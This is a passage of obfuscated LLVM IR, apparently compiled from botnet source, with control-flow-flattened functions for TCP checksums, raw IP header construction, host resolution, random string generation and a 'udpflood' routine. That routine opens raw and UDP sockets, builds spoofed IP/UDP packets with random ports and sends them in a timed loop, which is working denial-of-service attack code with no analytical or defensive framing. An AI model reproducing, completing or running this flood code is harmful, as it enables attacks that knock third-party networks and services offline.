  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 1805796059, i32 -785535718
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 -785535718, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -804354990, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 -1420446186, i32 -106757514
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 -804354990, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  store i32 24, i32* %7, align 4
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = call noalias i8* @malloc(i64 %26) #6
  %28 = bitcast i8* %27 to i16*
  store i16* %28, i16** %8, align 8
  %29 = load i16*, i16** %8, align 8
  %30 = bitcast i16* %29 to i8*
  %31 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %30, i8* %31, i64 24, i32 1, i1 false)
  %32 = load i16*, i16** %8, align 8
  %33 = bitcast i16* %32 to i8*
  %34 = getelementptr inbounds i8, i8* %33, i64 24
  %35 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %36 = bitcast %struct.tcphdr* %35 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %34, i8* %36, i64 20, i32 1, i1 false)
  %37 = load i16*, i16** %8, align 8
  %38 = load i32, i32* %7, align 4
  %39 = call zeroext i16 @csum(i16* %37, i32 %38)
  store i16 %39, i16* %9, align 2
  %40 = load i16*, i16** %8, align 8
  %41 = bitcast i16* %40 to i8*
  call void @free(i8* %41) #6
  %42 = load i16, i16* %9, align 2
  ret i16 %42
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #6
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1801545331, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1801545331, label %first
    i32 -2075879926, label %13
    i32 1508937378, label %14
    i32 -1091630965, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -2075879926, i32 1508937378
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -1091630965, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -1091630965, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @filter(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 38506462, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 38506462, label %3
    i32 1461268038, label %13
    i32 1004930085, label %22
    i32 1069094790, label %24
    i32 -1446515573, label %30
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = call i64 @strlen(i8* %5) #10
  %7 = sub i64 %6, 1
  %8 = getelementptr inbounds i8, i8* %4, i64 %7
  %9 = load i8, i8* %8, align 1
  %10 = sext i8 %9 to i32
  %11 = icmp eq i32 %10, 13
  %12 = select i1 %11, i32 1004930085, i32 1461268038
  store i32 %12, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i8*, i8** %2, align 8
  %15 = load i8*, i8** %2, align 8
  %16 = call i64 @strlen(i8* %15) #10
  %17 = sub i64 %16, 1
  %18 = getelementptr inbounds i8, i8* %14, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = sext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  store i32 1004930085, i32* %switchVar
  store i1 %21, i1* %.reg2mem
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %23 = select i1 %.reload, i32 1069094790, i32 -1446515573
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %2, align 8
  %26 = load i8*, i8** %2, align 8
  %27 = call i64 @strlen(i8* %26) #10
  %28 = sub i64 %27, 1
  %29 = getelementptr inbounds i8, i8* %25, i64 %28
  store i8 0, i8* %29, align 1
  store i32 38506462, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %24, %22, %13, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i8* @makestring() #0 {
  %.reg2mem = alloca %struct._IO_FILE*
  %1 = alloca i8*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = call i32 @rand() #6
  %9 = srem i32 %8, 5
  %10 = add nsw i32 %9, 4
  store i32 %10, i32* %2, align 4
  %11 = load i32, i32* %2, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #6
  store i8* %14, i8** %1, align 8
  %15 = load i8*, i8** %1, align 8
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, 1
  %18 = sext i32 %17 to i64
  call void @llvm.memset.p0i8.i64(i8* %15, i8 0, i64 %18, i32 1, i1 false)
  %19 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %.reg2mem
  %.reload2 = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  store %struct._IO_FILE* %.reload2, %struct._IO_FILE** %4, align 8
  %switchVar = alloca i32
  store i32 -1427183887, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1427183887, label %first
    i32 -202173099, label %22
    i32 -253139996, label %23
    i32 1346688417, label %28
    i32 -490483524, label %37
    i32 -1263656389, label %40
    i32 362426088, label %41
    i32 -1646698581, label %47
    i32 1302293622, label %52
    i32 369566574, label %56
    i32 2112105602, label %59
    i32 1487911331, label %71
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  %20 = icmp eq %struct._IO_FILE* %.reload, null
  %21 = select i1 %20, i32 -202173099, i32 362426088
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -253139996, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %3, align 4
  %25 = load i32, i32* %2, align 4
  %26 = icmp slt i32 %24, %25
  %27 = select i1 %26, i32 1346688417, i32 -1263656389
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = call i32 @rand() #6
  %30 = srem i32 %29, 26
  %31 = add nsw i32 %30, 65
  %32 = trunc i32 %31 to i8
  %33 = load i8*, i8** %1, align 8
  %34 = load i32, i32* %3, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  store i8 %32, i8* %36, align 1
  store i32 -490483524, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %3, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %3, align 4
  store i32 -253139996, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  store i32 1487911331, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32 @rand() #6
  %43 = call i32 @rand() #6
  %44 = mul nsw i32 %42, %43
  %45 = srem i32 %44, 45402
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %6, align 4
  store i32 0, i32* %3, align 4
  store i32 -1646698581, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %3, align 4
  %49 = load i32, i32* %6, align 4
  %50 = icmp slt i32 %48, %49
  %51 = select i1 %50, i32 1302293622, i32 2112105602
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %54 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %55 = call i8* @fgets(i8* %53, i32 1024, %struct._IO_FILE* %54)
  store i32 369566574, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i32, i32* %3, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %3, align 4
  store i32 -1646698581, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 1024, i32 16, i1 false)
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %62 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %63 = call i8* @fgets(i8* %61, i32 1024, %struct._IO_FILE* %62)
  %64 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @filter(i8* %64)
  %65 = load i8*, i8** %1, align 8
  %66 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %67 = load i32, i32* %2, align 4
  %68 = sext i32 %67 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %65, i8* %66, i64 %68, i32 1, i1 false)
  %69 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %70 = call i32 @fclose(%struct._IO_FILE* %69)
  store i32 1487911331, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8*, i8** %1, align 8
  ret i8* %72

loopEnd:                                          ; preds = %59, %56, %52, %47, %41, %40, %37, %28, %23, %22, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #5

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #5

declare i32 @fclose(%struct._IO_FILE*) #5

; Function Attrs: noinline nounwind uwtable
define void @udpflood(i8*, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.udphdr*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 10, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = load i32, i32* %6, align 4
  store i32 %27, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1885316298, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1885316298, label %first
    i32 1829211840, label %30
    i32 241967704, label %34
    i32 -885445565, label %39
    i32 972313086, label %45
    i32 -1288290417, label %46
    i32 575408852, label %53
    i32 -250277231, label %58
    i32 981665419, label %59
    i32 631301291, label %67
    i32 -2043754104, label %68
    i32 919823596, label %80
    i32 -628366507, label %91
    i32 120090718, label %95
    i32 -208621179, label %99
    i32 -1784702633, label %105
    i32 626289322, label %106
    i32 -1165244470, label %107
    i32 2069942347, label %110
    i32 -1551944151, label %111
    i32 22373703, label %116
    i32 405304879, label %117
    i32 -338700247, label %123
    i32 -966989957, label %124
    i32 -710296382, label %125
    i32 -1449598403, label %130
    i32 96949475, label %137
    i32 -1410912045, label %141
    i32 -1619348296, label %142
    i32 998066648, label %148
    i32 1579307389, label %184
    i32 601278762, label %186
    i32 -309533586, label %191
    i32 2108783135, label %214
    i32 1135360337, label %215
    i32 150302567, label %226
    i32 395240676, label %228
    i32 -256545243, label %233
    i32 -1182071284, label %258
    i32 1080765494, label %264
    i32 -1333278520, label %265
    i32 -1097687936, label %266
    i32 1330746140, label %269
    i32 40870114, label %271
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %28 = icmp eq i32 %.reload, 0
  %29 = select i1 %28, i32 1829211840, i32 241967704
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  store i32 -885445565, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %6, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #9
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 -885445565, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8*, i8** %5, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  %44 = select i1 %43, i32 972313086, i32 -1288290417
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 40870114, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %9, align 4
  store i32 %49, i32* %12, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  %52 = select i1 %51, i32 575408852, i32 -1551944151
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %54, i32* %13, align 4
  %55 = load i32, i32* %13, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 981665419, i32 -250277231
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 40870114, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %8, align 4
  %61 = add nsw i32 %60, 1
  %62 = sext i32 %61 to i64
  %63 = call noalias i8* @malloc(i64 %62) #6
  store i8* %63, i8** %14, align 8
  %64 = load i8*, i8** %14, align 8
  %65 = icmp eq i8* %64, null
  %66 = select i1 %65, i32 631301291, i32 -2043754104
  store i32 %66, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 40870114, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %14, align 8
  %70 = load i32, i32* %8, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  call void @llvm.memset.p0i8.i64(i8* %69, i8 0, i64 %72, i32 1, i1 false)
  %73 = load i8*, i8** %14, align 8
  %74 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %73, i32 %74)
  %75 = call i64 @time(i64* null) #6
  %76 = load i32, i32* %7, align 4
  %77 = sext i32 %76 to i64
  %78 = add nsw i64 %75, %77
  %79 = trunc i64 %78 to i32
  store i32 %79, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 919823596, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %13, align 4
  %82 = load i8*, i8** %14, align 8
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %86 = call i64 @sendto(i32 %81, i8* %82, i64 %84, i32 0, %struct.sockaddr* %85, i32 16)
  %87 = load i32, i32* %16, align 4
  %88 = load i32, i32* %12, align 4
  %89 = icmp eq i32 %87, %88
  %90 = select i1 %89, i32 -628366507, i32 -1165244470
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %6, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 120090718, i32 -208621179
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = call i32 @rand_cmwc()
  %97 = trunc i32 %96 to i16
  %98 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %97, i16* %98, align 2
  store i32 -208621179, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = call i64 @time(i64* null) #6
  %101 = load i32, i32* %15, align 4
  %102 = sext i32 %101 to i64
  %103 = icmp sgt i64 %100, %102
  %104 = select i1 %103, i32 -1784702633, i32 626289322
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 2069942347, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 0, i32* %16, align 4
  store i32 919823596, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load i32, i32* %16, align 4
  %109 = add i32 %108, 1
  store i32 %109, i32* %16, align 4
  store i32 919823596, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 40870114, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %112, i32* %17, align 4
  %113 = load i32, i32* %17, align 4
  %114 = icmp ne i32 %113, 0
  %115 = select i1 %114, i32 405304879, i32 22373703
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 40870114, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %118 = load i32, i32* %17, align 4
  %119 = bitcast i32* %18 to i8*
  %120 = call i32 @setsockopt(i32 %118, i32 0, i32 3, i8* %119, i32 4) #6
  %121 = icmp slt i32 %120, 0
  %122 = select i1 %121, i32 -338700247, i32 -966989957
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 40870114, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  store i32 50, i32* %19, align 4
  store i32 -710296382, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %19, align 4
  %127 = add nsw i32 %126, -1
  store i32 %127, i32* %19, align 4
  %128 = icmp ne i32 %126, 0
  %129 = select i1 %128, i32 -1449598403, i32 96949475
  store i32 %129, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = call i64 @time(i64* null) #6
  %132 = call i32 @rand_cmwc()
  %133 = zext i32 %132 to i64
  %134 = xor i64 %131, %133
  %135 = trunc i64 %134 to i32
  call void @srand(i32 %135) #6
  %136 = call i32 @rand() #6
  call void @init_rand(i32 %136)
  store i32 -710296382, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* %10, align 4
  %139 = icmp eq i32 %138, 0
  %140 = select i1 %139, i32 -1410912045, i32 -1619348296
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  store i32 0, i32* %20, align 4
  store i32 998066648, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  %143 = load i32, i32* %10, align 4
  %144 = sub nsw i32 32, %143
  %145 = shl i32 1, %144
  %146 = sub nsw i32 %145, 1
  %147 = xor i32 %146, -1
  store i32 %147, i32* %20, align 4
  store i32 998066648, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %8, align 4
  %150 = sext i32 %149 to i64
  %151 = add i64 28, %150
  store i64 %151, i64* %.reg2mem2
  %152 = call i8* @llvm.stacksave()
  store i8* %152, i8** %21, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %153 = alloca i8, i64 %.reload4, align 16
  store i8* %153, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %154 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %154, %struct.iphdr** %22, align 8
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = bitcast %struct.iphdr* %155 to i8*
  %157 = getelementptr i8, i8* %156, i64 20
  %158 = bitcast i8* %157 to %struct.udphdr*
  store %struct.udphdr* %158, %struct.udphdr** %23, align 8
